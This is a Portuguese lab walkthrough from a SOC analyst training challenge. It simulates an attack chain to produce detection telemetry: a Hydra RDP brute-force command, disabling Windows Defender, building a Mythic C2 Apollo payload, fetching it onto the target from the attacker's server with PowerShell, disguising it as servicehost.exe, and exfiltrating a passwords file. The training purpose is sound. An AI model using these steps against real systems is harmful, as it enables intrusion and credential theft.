# 🛡️ 30-Day SOC Analyst Challenge - Day 21

---

## 🎯 Objetivos
Nessa aula, seguiremos o fluxo do nosso diagrama de ataque criado no dia 22.
- Configurar um *agent payload* com Mythic C2 utilizando o agente Apollo e o perfil HTTP
- Permitir regra de firewall endpoint para o retorno da chamada de comunicação do servidor de *Command & Control* 
- Hospedar e entregar um payload na máquina alvo utilizando *Python HTTP Server* 
- Executar o payload na máquina alvo para estabelecer uma conexão ativa de *Command & Control* (Active Callback) 
- Simular um processo de reconhecimento e exfiltração de dados através do Mythic C2.

---

## 🛠️ Ferramentas & Esclarecimentos
* **C2 Framework:** Mythic C2 (hospedado no Ubuntu Server)
* **Máquina alvo:** Windows Server 2022 (Com Elastic Agent & Sysmon instalados para gerar telemetria no Kibana)
* **Máquina do Atacante:** Kali Linux (usado como servidor para hospedar o payload HTTP / e usado como entregador do payload)
* **Payload Type:** Apollo Executable (`.exe`) via HTTP Profile

---

## 📝 Passo a Passo realizado

### 1) Fase 1 - Brute Force
Como estamos em um cenário hipotético e já temos conhecimento da infraestrutura e senha de cada servidor, vamos inserir a senha da máquina alvo em uma wordlist.
1. Na máquina Kali Linux, a senha da máquina alvo (windows server) foi inserida em uma wordlist.
2. Foi utilizada a ferramenta **hydra** para realizar o bruteforce utilizando a wordlist:
```
hydra -l Administrator -P [caminho da wordlist] -t 4 rdp://[ip da máquina alvo]
```
3. Após encontrar um resultado, realize login na máquina utilizando a credencial encontrada.

### 2) Fase 2 - Reconhecimento
Nessa fase, foi iniciado o processo de reconhecimento utilizando os seguintes comandos:
- `whoami`
- `ipconfig`
- `net user`
- `net group`

### 3) Fase 3 - Evasão de Defesas
Agora que estamos no sistema, vamos desabilitar o **Windows Defender**. Vale ressaltar que essa ação irá gerar um *Event ID 5001*.

### 4) Fase 4 - Execução
Antes de começar essa fase, foi necessário realizar a instalação do agente Apollo e instalar o HTTP Profile em meu servidor que hospeda o Mythic.
1. Acesse a interface web do **Mythic Web UI** via `https://<MYTHIC_IP>:7443`.
2. Vá até a aba de **Payloads** → **Generate New Payload**.
3. Preencha da seguinte forma:
   - **Target OS:** Windows
   - **Payload Type:** `Apollo`
   - **C2 Profile:** `HTTP`
   - **C2 Porta:** `80/443` (or `8080` / custom port)
   - **Select Commands**: Selecione todos os comandos disponíveis pelo Agente Apollo.
4. Por fim, criei o payload e realizei o download dele em meu Servidor do Mythic C2 utilizando o comando `wget [link do payload]`
5. Dentro do servidor do Mythic, no mesmo diretório o qual baixei o payload, abri um servidor HTTP utilizando Python com o comando `python3 -m http.server 8080`. Vale ressaltar que 8080 foi a porta que escolhi, mas fica a seu critério escolher a sua própria, contanto que a porta de sua escolha não esteja sendo utilizada por outro serviço.
6. Antes de baixar o payload em sua máquina alvo, crie uma regra no Firewall da Nuvem para permitir comunicação da máquina alvo (Windows) com o servidor do Mythic:
<img width="899" height="100" alt="image" src="https://github.com/user-attachments/assets/2b3c2e38-2c60-419c-a04f-7c7c4a850fb9" />

7. Na sua máquina alvo, realize o download do payload via PowerShell utilizando a linha de comando abaixo (Vale ressaltar que o que está entre colchetes varia de acordo com sua arquitetura):
```
Invoke-WebRequest -Uri http://[IP from your mythic server:port/payload_file] -OutFile [Caminho do diretório onde deseja salvar o arquivo]
```

### Fase 5 - Command & Control (C2)
1. Por fim, execute o payload que você baixou.
2. Ao executar o payload, você poderá visualizá-lo através do Task Manager na aba *Details*:
<img width="1007" height="750" alt="image" src="https://github.com/user-attachments/assets/9348ad7b-81a8-47fb-845c-92adf85edfc5" />

Para deixar o cenário mais realista, alterei o nome do meu payload para *servicehost.exe*, mas mesmo assim não muda o fato de que na coluna *Description* ele está nomeado como **Apollo**.

### Fase 6 - Exfiltração
Por fim, na aba de Callbacks, você deve conseguir ver o seu Agente sendo executado no servidor.
<img width="1198" height="672" alt="image" src="https://github.com/user-attachments/assets/7ed46d61-cdb3-49c2-8beb-b3e5a7c3f389" />

1. Crie um arquivo de senhas no diretório C:/Users/Administrator/Documents utilizando o comando `download`, que é um commando disponibilizado pelo agente Apollo.
```
download C:\Users\Administrator\Documents\passwords.txt
```
<img width="1217" height="390" alt="image" src="https://github.com/user-attachments/assets/253313cc-52e2-4069-a78d-e5d0d4c8638b" />

Esse arquivo vai conter login e senha do usuário corrente.

---

## 💡 Lições Aprendidas e Desafios
- Utilização da ferramenta Hydra para Brute Force via RDP
- Fase de reconhecimento utilizando comandos para obter informações sobre o sistema
- Evasão de defesa, seja desabilitando antivirus do sistema ou até o próprio Microsoft Defender.
- Criação de Payload utilizando Mythic e execução de payload na máquina alvo
- Exfiltração (técnica utilizada para obter dados do sistema)
